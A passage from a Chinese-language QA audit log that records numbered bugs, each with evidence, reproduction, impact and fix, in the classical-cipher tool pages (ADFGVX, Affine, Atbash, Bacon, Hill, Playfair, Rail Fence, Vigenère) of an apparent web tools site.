- 证据：`tools/it/caesar-cipher.html:609`（`setMode();`）、`tools/it/caesar-cipher.html:314-334`（无参时的分支）、`tools/it/caesar-cipher.html:373-374`
- 复现：在 TBKit 历史面板点一条"加密"记录 → 实际模式按钮无高亮、标签显示"密文/破解结果"、结果按解密方向计算；期望恢复原 `mode` 并高亮"加密"。
- 影响：从历史恢复后状态错乱，用户再点"加密"才恢复；与自带 `loadHistory()` 的行为不一致。
- 方案：`setMode(rec.mode || 'encrypt')`，或从 `snap` 里带出 `mode` 字段一并回填。

- 留存建议（caesar-cipher）：①解密方向按字母表大小（26/95）计算并补往返用例；②历史写入加防抖、容量改为按完整输入去重；③统一两套历史（自带 localStorage 与 TBKit），去掉重复面板。

- 备注：`tools/it/base58-encode.html:327` 与 `tools/it/base85-encode.html:360` 的复制按钮仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效），与 IT-N31 同模式，不重复计数、未单列。`tools/it/barcode-upc.html:245-246` 自建 `L_CODES/R_CODES` 与 `js/barcode-lib.js:101-106` 重复，且未加载共享库，属 N127/N128 的根因。

- 覆盖小结：本轮实读 8 页（base58-encode、base85-encode、barcode-code128、barcode-upc、bluetooth-version、usb-version、ascii-table、caesar-cipher），新增 26 条（高 3 / 中 13 / 低 10），编号 IT-N117~IT-N142。未覆盖：本分区其余约 265 页（含 http-methods、gitignore/dockerfile 生成器、shell-script-formatter、各类加密/编码页与全部速查表页）；未做浏览器、英文态、繁体、移动端、门禁与线上部署验证。

## 2026-11-04 续查（并行批 P-2）

- 范围：`tools/it/` 下 8 个古典密码页（adfgvx-cipher、affine-cipher、atbash-cipher、bacon-cipher、hill-cipher、playfair-cipher、rail-fence-cipher、vigenere-visualizer），逐页完整读取 HTML、内联 JS、deep-dive 与 FAQ；编号续接 P 批第一波最大号 IT-N142，本批新增 IT-N143~IT-N166。
- 方法：纯静态阅读 + `node -e`/`node /tmp/*.js` 按页内算法逐函数复算；未开浏览器、未跑构建、未做 git 写。

### IT-N143 ADFGVX 解密列还原用错置换表，非对合密钥（含默认 CIPHER）加解密不可逆（高，确认源码缺陷）
- 问题：加密按「目标名次→原始列」读取，用 `order.indexOf(target)`；解密却按「第 i 个密文块→`order[i]`」回填。`order[i]` 是原始列 i 的名次，不是名次 i 对应的原始列，二者只在置换恰好为对合时相等。默认 `transKey=CIPHER` 的 `order=[0,3,4,2,1,5]`，名次 2 应回填原始列 2，代码却回填 4，名次与原始列被互换。
- 证据：`tools/it/adfgvx-cipher.html:298-304`（加密 `order.indexOf(target)`）、`tools/it/adfgvx-cipher.html:319-327`（解密 `const targetCol = order[i]`）、`tools/it/adfgvx-cipher.html:267-277`（`getTransOrder`）、`tools/it/adfgvx-cipher.html:174`（默认 `value="CIPHER"`）
- 复现（Node 复算页内函数）：默认 `transKey=CIPHER`，输入 `ATTACKATDAWN` 加密得 `AAAA DVFA DGDF DDDD DADF DGXA`；再点“解密”实际输出 `ATTNOGABM18E`，期望 `ATTACKATDAWN`。换 `FRANCE` 同样失败；`LEMON` 因 `order` 恰为对合才偶然正确。
- 影响：默认配置下用户无法解开自己刚生成的密文；任何非对合密钥全部解错，且错位后还会从 6×6 方阵里取到数字，输出看似“合法密文”，误导性很强。
- 方案：解密改为 `const targetCol = order.indexOf(i);`（与加密互逆），并为 `CIPHER`/`FRANCE`/`LEMON` 补加解密往返用例；`getTransOrder` 可同时缓存逆置换避免重复 `indexOf`。

### IT-N144 ADFGVX 解密不剥除补位 X，尾部被当作正文解码（中，确认源码缺陷）
- 问题：加密用 `while(intermediate.length < numRows*numCols) intermediate += 'X'` 补齐整行；解密按矩阵还原全部中间串后逐对解码，没有记录/剔除补位长度，补位字母会继续走方阵映射变成正文。
- 证据：`tools/it/adfgvx-cipher.html:291-297`（补 X）、`tools/it/adfgvx-cipher.html:328-340`（解密全量解码，无剥除）
- 复现（Node 复算）：`transKey=LEMON`，输入 `HIJ` → 密文 `XX AD GX VX XX` → 解密实际 `HIJYY`（5 字符），期望 `HIJ`。补位对经方阵映射后不一定还原成 X，会变成任意字母。
- 影响：凡中间串长度不是列数整数倍（大多数字符数都会出现），解密结果尾部多出 1–N 个无意义字母，用户无法判断哪些是填充。
- 方案：加密时把补位个数存入输出（如前置 `rows*cols - intermediate.length` 标记或写进历史），解密按该数在分对前截断；至少在 UI 提示“末尾补位需手动删除”。

### IT-N145 ADFGVX 三个预设把 36 格方阵密钥写成 KEY/SECRET/BREAK，被 `getGrid()` 静默忽略（低，确认源码缺陷）
- 问题：`getGrid()` 仅当去噪后长度恰为 36 才采用，否则回退 `DEFAULT_KEY`；预设一/二/三分别写入 `key=KEY`、`SECRET`、`BREAK`，长度都不足 36，方阵永远不变，但输入框里确实填了值。
- 证据：`tools/it/adfgvx-cipher.html:257-261`（长度 36 才生效）、`tools/it/adfgvx-cipher.html:484-487`（三个非法 key）、`tools/it/adfgvx-cipher.html:170-171`（占位提示“36 个字符”）
- 复现：点“示例一”→ `key` 输入框显示 `KEY`，右侧 6×6 方阵仍为默认 `NA1C3H...`；期望预设切换方阵或明确提示“需 36 字符，当前已回退默认”。
- 影响：预设演示“自定义方阵”名不副实，用户以为换了密钥但密文与默认完全相同。
- 方案：给预设填一个真实 36 字符置换（如打乱的 0-9A-Z），或移除预设里的 `key` 字段；同时在输入框失焦时提示长度不合法并显示“使用默认方阵”。

- 留存建议（adfgvx-cipher）：①修正解密列映射并补三组密钥往返用例；②补位剥离或显式提示；③自定义方阵改为长度校验 + 可视化预览。

### IT-N146 Affine `a` 输入框清空触发 `gcd(NaN,26)` 无限递归，栈溢出（中，确认源码缺陷）
- 问题：`gcd` 只有 `b===0` 出口，无 `NaN`/非有限数保护；`renderGrid()` 与 `enc()` 都会调用 `gcd(a,26)`。数字框允许被清空，`parseInt('')` 得 `NaN`，`gcd(NaN,26) → gcd(26,NaN) → gcd(NaN,NaN) → …` 永不终止。
- 证据：`tools/it/affine-cipher.html:254`（递归 gcd）、`tools/it/affine-cipher.html:269`（enc 校验）、`tools/it/affine-cipher.html:304/311`（renderGrid 调用）、`tools/it/affine-cipher.html:169`（`oninput="renderGrid()"`）
- 复现（Node 复算）：`gcd(NaN,26)` 抛 `RangeError: Maximum call stack size exceeded`。页面操作：选中 `a` 框内容按 Backspace 清空 → 控制台立即栈溢出，映射表停在旧值，无任何提示；此时点“加密”同样抛错而非弹“a 必须与 26 互素”。
- 影响：清空/重输参数是常规操作，每次清空都会产生未捕获异常，映射表与按钮反馈失真，弱设备可能卡顿。
- 方案：先判 `Number.isInteger(a) && Number.isInteger(b)`，非法时仅显示红色提示、不调用 `gcd`；或把 gcd 改为迭代并加 `Number.isFinite` 守卫。

### IT-N147 Affine `b` 输入框清空后输出全为 NUL 字符，界面看似“空结果”且无告警（中，确认源码缺陷）
- 问题：`b` 被清空时 `parseInt` 得 `NaN`，加密/映射表执行 `String.fromCharCode(((a*i+NaN)%26)+65)`；`String.fromCharCode(NaN)` 返回 `\u0000`，26 个映射格与整段密文都变成不可见 NUL，现有 `NaN` 守卫只检查 HTML 字符串里是否出现字面量 `NaN`，捕不到真正的 NUL。
- 证据：`tools/it/affine-cipher.html:268`（读 b）、`tools/it/affine-cipher.html:273/275`（加密）、`tools/it/affine-cipher.html:309`（映射表）、`tools/it/affine-cipher.html:313`（无效值守卫）
- 复现（Node 复算）：`a=5,b=NaN`，`AFFINE` 六个字母全部变成 charCode 0。页面操作：清空 `b` 后映射表空格、加密结果肉眼为空，无错误提示。
- 影响：用户以为工具坏了或输出被吞；复制到别处得到一串不可见控制字符，可能污染下游文本。
- 方案：`b` 必须通过 `Number.isInteger(b) && b>=0 && b<=25` 校验，非法时禁用加密并显示红字；`renderGrid` 同样先校验。

### IT-N148 Affine 密钥 `a` 允许输入负数/超范围，负码点被写成数字与标点（中，确认源码缺陷）
- 问题：`min="1" max="25"` 只约束微调按钮，键盘仍可键入 `-5`；加密未把 `a` 归一化到 0–25，`(a*x+b)%26` 保持 JavaScript 负数余数，`fromCharCode(负值+65)` 落到 ASCII 数字/标点区。
- 证据：`tools/it/affine-cipher.html:169`（`min="1" max="25"`）、`tools/it/affine-cipher.html:273-275`（未归一化直接取模）、`tools/it/affine-cipher.html:269`（只校验 gcd，负奇数与 26 仍互素）
- 复现（Node 复算）：`a=-5,b=8`，加密 `AFFINE` 实际 `I00;<5`，期望在 1–25 内给出字母，或拒绝负数。
- 影响：`gcd(-5,26)=1` 通过校验，用户得到含数字/分号的“密文”，解密也会因负索引错乱；属于静默错误而非报错。
- 方案：读取后先 `a = ((a % 26) + 26) % 26`，再校验 `1..25` 且与 26 互素；同时用 `input` 事件过滤非数字字符。

- 留存建议（affine-cipher）：①参数校验统一收口（整数、范围、互素），拒绝空值/负数；②补 a=3/5/7/11/15/17/19/21/23/25 与 b=0/25 的往返用例；③映射表增加“当前 a,b 已回退/无效”状态。

### IT-N149 Atbash 原理区称“本质上是凯撒密码位移 13 的特例”，与两种映射的实际关系不符（中，确认源码缺陷）
- 问题：Atbash 是自反置换 `f(x)=25-x`（A→Z、B→Y）；凯撒位移 13（ROT13）是 `f(x)=x+13`（A→N）。两者都满足“二次还原”，但映射完全不同，不能称 Atbash 是 ROT13 的特例。
- 证据：`tools/it/atbash-cipher.html:245`（“本质上是凯撒密码在位移为13时的特例”）、`tools/it/atbash-cipher.html:351-359`（实际 `90 - code` / `122 - code`）
- 复现：按页面自身实现，`A` 加密为 `Z`；若按“位移 13 的特例”，`A` 应为 `N`。页面示例 1 的 `HELLO → SVOOL` 也证明不是 ROT13（ROT13 为 `URYYB`）。
- 影响：古典密码教学页面的核心概念错误，会误导初学者把“自反”与“ROT13”混为一谈。
- 方案：改为“Atbash 是字母表镜像置换 f(x)=25−x，与 ROT13 同为对合置换，但映射不同；ROT13 的 A→N，Atbash 的 A→Z”，并保留示例 3 的自反验证。

### IT-N150 Atbash / Playfair / Vigenère 三页 `oninput` 每次按键都写 localStorage，20 条上限被输入前缀刷满（中，确认源码缺陷）
- 问题：三页都把 `process()/transform()` 直接绑到输入框 `oninput`，且保存逻辑只在“与最新一条完全相同”时去重（Vigenère 连这层去重都没有）。每敲一个字符输入就变一次，于是 `H`、`He`、`Hel`… 逐条落库。
- 证据：`tools/it/atbash-cipher.html:180`（oninput）、`tools/it/atbash-cipher.html:367-369`（无条件 save）、`tools/it/atbash-cipher.html:423-425`（仅比首条 input）；`tools/it/playfair-cipher.html:205`、`tools/it/playfair-cipher.html:506-508`、`tools/it/playfair-cipher.html:648-650`；`tools/it/vigenere-visualizer.html:186`、`tools/it/vigenere-visualizer.html:433-435`、`tools/it/vigenere-visualizer.html:631-645`（完全无去重）
- 复现：清空历史后逐字输入 `Hello` → Atbash/Playfair 实际新增 5 条（每条为前缀），Vigenère 同样 5 条；输入 20 字符即占满 `MAX_HISTORY=20`，此前的真实记录全部被挤出。
- 影响：历史面板基本不可用；每次按键同步 `localStorage.setItem` + 重建 DOM，长文本输入有卡顿风险。
- 方案：改为 500ms 防抖或失焦/点击“转换”时写入；按最终完整输入去重（同一会话只保留最新一条），容量提高或按 hash 去重。

### IT-N151 Atbash / Playfair / Vigenère 的 TBKit 历史回填调用 `setMode()` 无参，模式变 `undefined`（低，确认源码缺陷）
- 问题：三页 `TBKit.history.mount` 的回填回调末尾都调用 `setMode()`（无参数）。`setMode` 内 `currentMode = undefined`，随后所有模式按钮失去 active；Atbash 标签走 else 变“输入文本/转换结果”，Playfair/Vigenère 标签变“密文/明文”，且 `process()` 中 `encrypt=false`，按解密方向重算。
- 证据：`tools/it/atbash-cipher.html:553`、`tools/it/atbash-cipher.html:332-349`；`tools/it/playfair-cipher.html:779`、`tools/it/playfair-cipher.html:381-389`；`tools/it/vigenere-visualizer.html:770`、`tools/it/vigenere-visualizer.html:344-352`
- 复现：在 TBKit 历史面板点一条“加密”记录 → 实际无按钮高亮、标签反转、结果按解密计算；期望恢复记录里的 `mode` 并高亮对应按钮。
- 影响：从 TBKit 历史恢复后状态错乱，与页面自带 `loadHistory()` 的行为不一致，用户需再点一次模式按钮才能恢复。
- 方案：`setMode(rec.mode || 'encrypt')`，并把 `mode` 一并写入 `TBKit.history.record` 的 `snap`。

- 留存建议（atbash-cipher）：①修正“ROT13 特例”表述；②历史写入防抖；③补“自反性一键验证”按钮（同一输入连续转换两次比对）。

### IT-N152 Bacon 只实现 26 字母二进制表，页面宣称的 24 字母版缺失，FAQ 对两版差异的说明也错误（中，确认源码缺陷）
- 问题：`TABLE` 由 `i.toString(2).padStart(5,'0')` 生成 0–25，即 A=00000…I=01000、J=01001…Y=11000、Z=11001；页面 formula-list 却写“24 字母版中 I/J 与 U/V 同码”，FAQ 进一步说“26 字母版则把剩余两个组合分配给 J 和 V”。实际 26 字母版是拆开 I/J 与 U/V、把后续字母整体顺延，码 24/25 落在 Y/Z，并不存在“剩余两个组合分给 J/V”。
- 证据：`tools/it/bacon-cipher.html:261-268`（唯一映射表）、`tools/it/bacon-cipher.html:148`（宣称两版）、`tools/it/bacon-cipher.html:213`（FAQ 错误说法）
- 复现（Node 复算）：24 字母版 `K = abaab`（二进制 01001），本页解码 `abaab` 得 `J`，期望 `K`；`I/J`、`U/V` 归并的 24 字母密文整段后移一位，K–Z 全部解错。页面无版本选择器。
- 影响：用户拿经典培根 24 字母表来解码会得到系统性错字；页面又声称支持两版，属于文档与实现不一致。
- 方案：增加“24 字母（I/J、U/V 同码）/26 字母（独立码）”切换，24 版按 0–23 建表；FAQ 改为“26 字母版把 I/J、U/V 拆开，K 起整体顺延，Y/Z 使用 11000/11001”。

### IT-N153 Bacon 编码静默丢弃所有非 A–Z 字符（空格、标点、数字），不提示丢了多少（低，确认源码缺陷）
- 问题：`enc()` 遍历输入但只在 `TABLE[ch]` 命中时输出，`else` 分支不存在；空格、标点、中文、数字全部被无声删除，输出长度随之缩短。
- 证据：`tools/it/bacon-cipher.html:271-284`（无 else/无计数）、`tools/it/bacon-cipher.html:174`（占位说“输入要编码的文本”）
- 复现：输入 `HELLO WORLD!` → 输出仅 10 个字母的编码，空格与 `!` 消失，页面无任何提示；期望保留分隔或提示“已忽略 2 个非字母字符”。
- 影响：含空格短句编码后无法从输出看出原词边界，用户误以为编码器漏字。
- 方案：统计并 toast 提示被忽略字符数；或提供“保留非字母原样”选项（解码端已能忽略非 a/b 字符，兼容）。

- 留存建议（bacon-cipher）：①补 24/26 版本切换并修正 FAQ；②编码增加“丢弃字符”提示；③映射表补 A/B 大写列（当前只展示 a/b 与 0/1，与 upper 模式不一致）。

### IT-N154 Hill deep-dive 算例 “HI → LM” 与矩阵复算结果不符，正确应为 LN（中，确认源码缺陷）
- 问题：正文示例给矩阵 `[[3,2],[5,7]]`、`H=7,I=8`，第二分量 `5*7+7*8=91`，`91 mod 26 = 13 = N`，页面却写 `LM`（`M` 对应 12）。
- 证据：`tools/it/hill-cipher.html:210`（示例文字）、`tools/it/hill-cipher.html:281-293`（`process()` 同一算式）
- 复现（Node 复算）：`hill([3,2,5,7], 'HI')` → `LN`；第一分量 `3*7+2*8=37 mod 26=11=L` 与页面一致，仅第二分量算错。
- 影响：教学算例与工具自身输出矛盾，用户照算例手算会得到不同答案。
- 方案：把示例改为 `HI → LN`，并在括号里补 `91 mod 26 = 13 → N`。

### IT-N155 Hill 密钥矩阵不校验/归一化负数与超范围整数，加密输出数字与控制字符（中，确认源码缺陷）
- 问题：`getMatrix()` 只检查“4 个且非 NaN”，接受 `-3`、`100` 等任意整数；`process()` 直接 `(m[0]*p1+m[1]*p2)%26`，负积得负余数，`fromCharCode(负值+65)` 落到 ASCII 数字/标点区。
- 证据：`tools/it/hill-cipher.html:295-299`（getMatrix 无范围校验）、`tools/it/hill-cipher.html:281-291`（未归一化取模）、`tools/it/hill-cipher.html:171`（纯文本输入，无 pattern）
- 复现（Node 复算）：`key=-3,3,2,5`，输入 `HELP` → 实际 `8IMT`（首字符 charCode 56），期望在 0–25 内给出字母或拒绝该矩阵。
- 影响：用户可输入负数做“模 26”实验，却得到含数字的伪密文；后续解密同样可能生成控制字符，且 `renderInfo()` 的行列式还可能显示负值。
- 方案：读取后对每个元素做 `((x % 26) + 26) % 26`，并校验为整数；`det()` 同样先归一化，UI 显示 0–25 的规范矩阵。

### IT-N156 Hill 文档称支持 2×2 或 3×3，实际仅 4 数字/2×2；小数被 `parseInt` 静默截断（低，确认源码缺陷）
- 问题：deep-dive 写“用 2×2 或 3×3 矩阵做加解密”，但输入框只收 4 个数字，`getMatrix()` 长度必须为 4，`process()` 固定按 2 个一组；另 `parseInt('3.7')` 得 3，用户输入小数会被悄悄改成整数。
- 证据：`tools/it/hill-cipher.html:208`（3×3 说法）、`tools/it/hill-cipher.html:170-171`（“4 个数字”）、`tools/it/hill-cipher.html:295-298`（长度 4 + parseInt）、`tools/it/hill-cipher.html:281-293`（固定 2 分组）
- 复现：输入 `3.7,3,2,5` → 实际按 `3,3,2,5` 计算且无提示；期望拒绝非整数或明确提示已取整。输入 9 个数字 → 直接弹“请输入 4 个数字”。
- 影响：文档承诺的 3×3 教学场景无法使用；小数密钥的静默取整会让结果与用户预期不符。
- 方案：删除 3×3 表述，或按数字个数支持 2×2/3×3；`Number()` + `Number.isInteger` 校验并在 UI 提示。

- 留存建议（hill-cipher）：①修正 LN 算例；②矩阵元素统一 mod 26 并校验整数；③补 3×3 或删掉该承诺，同时在“矩阵信息”里显示规范化后的矩阵。

### IT-N157 Playfair 解密复用明文预处理 `prepareText()`，密文中的双字母被插入 X 导致分组错位、往返失败（高，确认源码缺陷）
- 问题：`process()` 不区分模式，统一 `const pairs = prepareText(text)`。`prepareText()` 是明文预处理：遇同组两字母相同就插入 X、奇数末尾补 X。解密时输入的是密文，密文本应直接按每 2 字符切分，不能再插填充；一旦密文含相同字母对（如 `ZZ`），解密会把它拆成 `Z X`，后续所有分组整体错位。
- 证据：`tools/it/playfair-cipher.html:421-437`（prepareText 插 X）、`tools/it/playfair-cipher.html:478`（解密也调用）、`tools/it/playfair-cipher.html:461-464`（`encrypt` 标志只用于替换规则）
- 复现（Node 复算，默认密钥 PLAYFAIR）：输入 `XX` → 加密 `ZZZZ` → 切到解密 → 实际输出 `XWXWXWXW`（8 字符），期望 `XX`；输入单个 `X` → 密文 `ZZ` → 解密实际 `XWXW`（4 字符），期望 `X`。
- 影响：任何产生同字母密文对的明文（含 `XX`、以及被插入 X 后形成的 X-X 对）都无法还原；用户看到长度翻倍的无意义串，会认为密文损坏。
- 方案：拆成两个入口——加密走 `prepareText()`；解密只做 `text.toUpperCase().replace(/[^A-Z]/g,'')` 后按 `i += 2` 硬切（并校验偶数长度）。同时加密端遇 `a===b==='X'` 时改用 Q 填充，避免生成同字母对。

### IT-N158 Playfair 预设回调 `setMode()` 无参，点任一预设静默切到解密模式（高，确认源码缺陷）
- 问题：`TBKit.preset.bar(..., function(){ setMode(); })` 无参调用；`setMode` 把 `currentMode` 设为 `undefined`，两个模式按钮都不再 active，标签变成“密文/明文”，`process()` 里 `encrypt = currentMode==='encrypt'` 为 false，于是把预设里的明文当密文解密。
- 证据：`tools/it/playfair-cipher.html:826-831`（预设回调 `setMode();`）、`tools/it/playfair-cipher.html:381-389`（无参分支）、`tools/it/playfair-cipher.html:461-465`（encrypt 判定）、`tools/it/playfair-cipher.html:192-193`（加密/解密按钮）
- 复现：默认打开后点预设“SECRET 密钥显对”（值 `key=SECRET,input=HELLO WORLD`）→ 实际输出是 `HELLO WORLD` 的解密结果（乱码）、两个模式按钮无高亮、输入标签显示“密文”；期望按加密输出 `...` 并保持“加密”高亮。
- 影响：预设是主要上手入口，四个预设全部把用户带进错误模式；用户会以为加密算法坏了。
- 方案：回调改为 `setMode('encrypt')`（或 `setMode(currentMode || 'encrypt')`）；`setMode` 增加默认值 `mode = mode || 'encrypt'` 亦可兜底。

### IT-N159 Playfair 原理区 “26×26=676 种字母对” 与自身 5×5/I-J 合并（25×25=625）矛盾（中，确认源码缺陷）
- 问题：正文说“Playfair 有 26×26=676 种可能的字母对”，但同一页明确 5×5 方阵、I/J 共用一格，实际字母表 25 个，双字母组合是 25×25=625。
- 证据：`tools/it/playfair-cipher.html:275`（676 说法）、`tools/it/playfair-cipher.html:184`（I/J 合并）、`tools/it/playfair-cipher.html:395-413`（buildGrid 去 J 后 25 格）
- 复现：按 `buildGrid('PLAYFAIR')` 实得 25 个字母，任意两格有序组合 625；页面却用 676 解释频率分析难度。
- 影响：教学数字错误，夸大约 8% 的组合空间；与页面自身的方阵构造直接冲突，细心的读者会质疑整页可信度。
- 方案：改为 25×25=625，并补一句“若使用 6×6 含数字变体则为 36×36=1296”。

### IT-N160 Playfair deep-dive 示例 “HI → BM” 未给密钥且与默认密钥实算 EB 不符（低，待验证）
- 问题：示例只写“如 HI → `BM`（示例密钥方阵）”，没有给出方阵内容；按页面默认密钥 `PLAYFAIR` 实算，H 在第 3 行第 3 列、I 在第 2 行第 1 列，矩形对角为 E 与 B，结果 `EB`，不是 `BM`。
- 证据：`tools/it/playfair-cipher.html:323`（HI→BM）、`tools/it/playfair-cipher.html:197`（默认 key=PLAYFAIR）、`tools/it/playfair-cipher.html:395-413`（方阵构造）、`tools/it/playfair-cipher.html:828-831`（四个预设密钥）
- 复现（Node 复算）：`HI` 在默认 `PLAYFAIR` 下 → `EB`；四个预设密钥实算分别为 `PLAYFAIR→EB`、`MONARCHY→BF`、`SECRET→IK`、`KEYWORD→IL`，均非 `BM`，页面 `BM` 无法在任一内置配置复现。
- 影响：示例不可复现，用户按默认参数试算对不上，降低信任；因未给密钥，暂列待验证而非确认错误。
- 方案：示例标注完整 5×5 方阵（或指定 key），并按该方阵重算 HI 的结果。

- 留存建议（playfair-cipher）：①加解密分组逻辑分离（解密禁止插填充）；②预设显式 `setMode('encrypt')`；③把 676 改 625，并为 deep-dive 示例补密钥/方阵。

### IT-N161 Rail Fence deep-dive 示例密文与 14 字母明文不匹配（页面给出 18 字母，实算 14 字母）（中，确认源码缺陷）
- 问题：示例标题是 `WEAREDISCOVERED`（14 字母）`rail=3`，正文却给 `WECRLTEERDSOEEAIVD`（18 字母）；该串实际来自更长的 25 字母默认明文，长度与明文不符。
- 证据：`tools/it/rail-fence-cipher.html:214`（示例）、`tools/it/rail-fence-cipher.html:271-298`（`buildRailMatrix`/`enc`）
- 复现（Node 复算）：`railEncrypt('WEAREDISCOVERED',3)` 实际 `WECRERDSOEEAIVD`（14 字符）；页面串 `WECRLTEERDSOEEAIVD` 为 18 字符，且包含 `L/T/E` 等 14 字母串中不存在的字符。
- 影响：置换密码算例无法手算核对，用户按示例验证会认为工具算错。
- 方案：改为 `WECRERDSOEEAIVD`；若要展示 25 字母经典例，标题同步改为 `WEAREDISCOVEREDFLEEATONCE` 与 `WECRLTEERDSOEEFEAOCAIVDEN`。

### IT-N162 Rail Fence 深度输入框清空/输入 1 时 `renderGrid()` 抛 TypeError，矩阵预览停止更新（中，确认源码缺陷）
- 问题：`depth` 的 `oninput="renderGrid()"` 无守卫；`renderGrid` 直接 `buildRailMatrix(clean, depth)`。`depth=''` → `NaN`，`Array.from({length:NaN})` 得空数组，随后 `matrix[0][c]` 抛 `TypeError`；`depth=1` 时首行写入后 `r+=1`，第二列访问 `matrix[1]` 同样未定义。
- 证据：`tools/it/rail-fence-cipher.html:170`（oninput）、`tools/it/rail-fence-cipher.html:333-340`（renderGrid 无校验）、`tools/it/rail-fence-cipher.html:271-281`（buildRailMatrix 直接索引）
- 复现（Node 复算）：`buildRailMatrix('ABC',NaN)` 与 `buildRailMatrix('ABC',1)` 均抛 `TypeError: Cannot set properties of undefined`。页面操作：选中深度值按 Backspace 清空 → 控制台报错，右侧“栅栏可视化”停在旧矩阵；输入 1（数字框 min=2 不阻止键盘）同样崩溃。
- 影响：改深度是高频操作，清空重输的每个中间态都会抛未捕获异常，预览与输入不同步；用户误以为可视化坏了。
- 方案：`renderGrid` 先判 `Number.isInteger(depth) && depth>=2 && depth<=clean.length`，不合法时清空/提示“深度需 2–文本长度”，不调用 `buildRailMatrix`；`enc/dec` 已有同类校验可复用。

- 留存建议（rail-fence-cipher）：①修正 deep-dive 示例；②预览构建加深度守卫；③“保留空格”旁注明空白也参与置换、解密后位置会改变。

### IT-N163 Vigenère deep-dive 算例 “ATTACK + KEY → AXVCZ” 完全算错，密钥字母也错位（中，确认源码缺陷）
- 问题：标准维吉尼亚加密 `A+K=K`、`T+E=X`、`T+Y=R`、`A+K=K`、`C+E=G`、`K+Y=I`，`ATTACK` 应为 `KXRKGI`；页面写 `A+K=A、T+E=X、T+C=V`，把第三个密钥字母写成 C（实际循环到 Y），并给出 5 字母的 `AXVCZ`（比明文少 1 位）。
- 证据：`tools/it/vigenere-visualizer.html:284`（deep-dive 示例）、`tools/it/vigenere-visualizer.html:362-416`（`vigenere()` 算法）、`tools/it/vigenere-visualizer.html:183`（默认 key=LEMON）
- 复现（Node 复算页内函数）：`vigenere('ATTACK','KEY',true)` → `KXRKGI`；`ATTACKATDAWN` + `LEMON` → `LXFOPVEFRNHR`（后者正确，说明算法本身无误，仅示例文案错）。
- 影响：核心教学算例与工具输出矛盾，用户按示例手算/对照分步演示会发现对不上。
- 方案：把示例改为 `ATTACK → KXRKGI`，逐位写 `A+K=K、T+E=X、T+Y=R、A+K=K、C+E=G、K+Y=I`。

### IT-N164 Vigenère 解密分步面板把密文字母标成“明文字母”，位置字段命名整体反转（中，确认源码缺陷）
- 问题：`vigenere()` 解密时 `step.plain = ch`（输入的是密文）、`step.plainIdx = p`（密文字母下标）、`step.cipherIdx = c`（解出的明文字母下标）；`updateStepDisplay()` 却固定输出“明文字母: step.plain（位置 step.plainIdx）”“结果: step.cipher（位置 step.cipherIdx）”，解密模式下前两项展示的是密文，标签与数值全部错位。
- 证据：`tools/it/vigenere-visualizer.html:371-401`（解密分支字段赋值）、`tools/it/vigenere-visualizer.html:470-494`（分步面板文案与公式）、`tools/it/vigenere-visualizer.html:485-487`（解密公式用 `cipherIdx - keyIdx = plainIdx`）
- 复现：解密 `LXFOPVEFRNHR`（LEMON）第 1 步，密钥 L、密文 L、明文 A → 面板显示“明文字母: L（位置 11）”（实际 L 是密文，明文字母应为 A/0），公式显示 `(0 - 11 + 26) mod 26 = 11`，左侧实算 15 ≠ 11，数值本身也对不上。
- 影响：分步演示是本页核心卖点，解密模式下讲解文字与公式变量名全部反了（且公式左右不相等），学习者会混淆 P/C 的角色、无法据此手算。
- 方案：为 step 增加 `inLetter/inIdx/outLetter/outIdx` 并按模式渲染（加密：明文→密文，`(inIdx+k) mod 26 = outIdx`；解密：密文→明文，`(inIdx-k+26) mod 26 = outIdx`），不要把 `plainIdx/cipherIdx` 在两种模式下复用为不同含义。

### IT-N165 Vigenère 解密时方阵高亮行列互换（应高亮密钥行 + 明文字列，实际高亮明文字母行 + 密钥列）（低，确认源码缺陷）
- 问题：方阵定义为“行=密钥字母、列=明文字母”。解密查找应在密钥行中找密文字母、读出列头明文；代码解密时取 `rowIdx = step.cipherIdx`（明文字母下标）、`colIdx = step.keyIdx`，把行列对调。由于 `(key+plain)` 可交换，高亮格子的字母值恰好仍是密文，但行/列标题指向错误字母。
- 证据：`tools/it/vigenere-visualizer.html:549-563`（方阵构造 `(i+j)%26`）、`tools/it/vigenere-visualizer.html:578-588`（解密行列选择）
- 复现：解密 `LXFOPVEFRNHR`（LEMON）第 1 步，密钥 L、密文 L、明文 A → 实际高亮行 A、列 L（格子值 L）；期望高亮行 L、列 A。
- 影响：视觉演示与文字说明“行=密钥、列=明文”不一致，用户对照方阵会读错交叉点。
- 方案：解密分支改为 `rowIdx = step.keyIdx; colIdx = step.cipherIdx`（即明文字母下标），加密分支保持 `rowIdx=keyIdx; colIdx=plainIdx`。

### IT-N166 Vigenère 空密钥静默回退 `'A'`，加密输出原样返回且无提示（低，确认源码缺陷）
- 问题：`vigenere()` 中 `if(!key) key='A'`，位移 0，等价于不加密；`process()` 仍把结果写入输出并记历史，用户清空密钥后看到“成功”的原样输出。
- 证据：`tools/it/vigenere-visualizer.html:362-364`（空 key 回退 A）、`tools/it/vigenere-visualizer.html:418-436`（process 无密钥校验/无提示）
- 复现：清空密钥框 → 输入 `ATTACK` → 输出仍为 `ATTACK`，无任何错误或提示；期望提示“请输入密钥”或至少显示“位移 0，未加密”。
- 影响：用户会误以为加密成功，把明文当密文使用；历史里也留下误导记录。
- 方案：`process()` 在 `key.trim()` 为空时弹提示并停止；或在输出区标注“密钥为空，未执行位移”。

- 留存建议（vigenere-visualizer）：①修正 deep-dive 算例与密钥字母；②解密分步文案/公式/高亮按 P/C 角色分离；③空密钥拒绝计算，历史写入防抖。

- 备注：`adfgvx-cipher`、`affine-cipher`、`hill-cipher`、`rail-fence-cipher`、`bacon-cipher` 的“复制结果”仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效），与 IT-N31 同模式，未重复计数；8 页的 TBKit `*ResText()` 均读 `textarea` 的 `textContent`（恒空）导致数据表/趋势图/CSV 恒空，与 IT-N140 同类模板缺陷，已在 IT-N140 统一记录，本批不重复编号。

- 覆盖小结：本轮实读 8 页（adfgvx-cipher、affine-cipher、atbash-cipher、bacon-cipher、hill-cipher、playfair-cipher、rail-fence-cipher、vigenere-visualizer），新增 24 条（高 3 / 中 14 / 低 7），编号 IT-N143~IT-N166。未覆盖：本分区其余约 257 页（含全部编码/哈希/格式化/HTTP/Git/Docker 生成器与速查表）；未做浏览器、英文态、繁体、移动端、门禁与线上部署验证。

### IT-N167 KSUID 多行结果复制成一串无分隔，导出 CSV 只导历史表（中，确认源码缺陷）
